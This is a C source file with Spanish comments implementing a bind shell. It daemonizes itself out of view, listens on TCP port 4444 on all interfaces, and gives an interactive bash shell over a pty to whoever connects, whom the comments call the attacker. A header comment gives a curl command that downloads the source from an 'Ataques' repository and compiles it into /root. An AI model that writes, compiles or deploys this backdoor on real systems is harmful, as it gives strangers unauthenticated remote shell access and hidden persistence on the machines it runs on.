// 
// Descarga remota y compilación:
//  curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/BashReverso.c > /tmp/BashReverso.c; gcc /tmp/BashReverso.c -o /root/bindshell6
//
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <signal.h>
#include <pty.h>
#include <string.h>

void daemonize() {
    printf("[+] Iniciando daemonización\n");
    pid_t pid = fork();
    if (pid < 0) {
        perror("[-] Error en fork()");
        exit(1);
    }
    if (pid > 0) exit(0);

    if (setsid() < 0) {
        perror("[-] Error en setsid()");
        exit(1);
    }
    signal(SIGHUP, SIG_IGN);

    pid = fork();
    if (pid < 0) {
        perror("[-] Error en segundo fork()");
        exit(1);
    }
    if (pid > 0) exit(0);

    int fd = open("/dev/null", O_RDWR);
    if (fd >= 0) {
        dup2(fd, STDIN_FILENO);
        dup2(fd, STDOUT_FILENO);
        dup2(fd, STDERR_FILENO);
        close(fd);
    }

    chdir("/");
    umask(0);
    printf("[+] Proceso daemonizado con éxito\n");
}

int main() {
    printf("[+] Iniciando bindshell\n");
    daemonize();

    int sockfd, clientfd;
    struct sockaddr_in server_addr;
    char buffer[1024];
    ssize_t n;
    int master_fd, slave_fd;
    pid_t pid;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("[-] Error al crear socket");
        exit(1);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(4444);

    if (bind(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("[-] Error en bind()");
        exit(1);
    }
    printf("[+] Socket creado y vinculado al puerto 4444\n");

    if (listen(sockfd, 1) < 0) {
        perror("[-] Error en listen()");
        exit(1);
    }
    printf("[+] Escuchando conexiones entrantes...\n");

    while (1) {
        clientfd = accept(sockfd, NULL, NULL);
        if (clientfd < 0) {
            perror("[-] Error en accept()");
            continue;
        }
        printf("[+] Cliente conectado\n");

        if (openpty(&master_fd, &slave_fd, NULL, NULL, NULL) < 0) {
            perror("[-] Error en openpty()");
            exit(1);
        }

        pid = fork();
        if (pid == 0) { // Proceso hijo: ejecuta el shell
            close(sockfd);
            close(master_fd);

            dup2(slave_fd, STDIN_FILENO);
            dup2(slave_fd, STDOUT_FILENO);
            dup2(slave_fd, STDERR_FILENO);
            close(slave_fd);

            char *shell[] = {"/bin/bash", "-i", NULL};
            execve("/bin/bash", shell, NULL);
            perror("[-] Error en execve()");
            exit(1);
        }

        close(slave_fd);

        // Redirigir datos entre el atacante y la shell
        fd_set fds;
        while (1) {
            FD_ZERO(&fds);
            FD_SET(clientfd, &fds);
            FD_SET(master_fd, &fds);

            int max_fd = (clientfd > master_fd ? clientfd : master_fd) + 1;
            int activity = select(max_fd, &fds, NULL, NULL, NULL);
            if (activity < 0) {
                perror("[-] Error en select()");
                break;
            }

            // Si hay datos del atacante -> enviarlos al shell
            if (FD_ISSET(clientfd, &fds)) {
                n = read(clientfd, buffer, sizeof(buffer));
                if (n <= 0) break;
                write(master_fd, buffer, n);
            }

            // Si hay datos del shell -> enviarlos al atacante
            if (FD_ISSET(master_fd, &fds)) {
                n = read(master_fd, buffer, sizeof(buffer));
                if (n <= 0) break;
                write(clientfd, buffer, n);
            }
        }

        close(master_fd);
        close(clientfd);
    }

    close(sockfd);
    return 0;
}
